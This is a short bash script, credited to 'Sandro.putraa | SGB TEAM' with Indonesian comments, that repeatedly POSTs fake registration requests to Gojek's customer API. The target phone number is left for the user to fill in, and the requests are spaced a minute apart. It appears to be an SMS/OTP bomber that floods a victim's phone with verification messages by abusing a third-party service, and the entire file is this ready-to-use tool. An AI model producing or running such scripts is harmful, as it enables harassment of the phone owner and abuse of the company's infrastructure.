#!/bin/bash
#code by Sandro.putraa | SGB TEAM

cyan='\e[0;36m'

for i in {1..10}; do
echo -e $cyan">>>> Hasil >>>>"

curl -d '{"phone":"+ edit bagian sini (+) jangan di hilangin ", "name":"memjasd" , "email":"hjsgadhgj@gmail.com"}' -H "Authorization: Bearer" -H "Content-Type: application/json; charset=UTF-8" -H "Host: api.gojekapi.com" -H "Connection: Keep-Alive" -X POST https://api.gojekapi.com/v4/customers $i
sleep 60
done
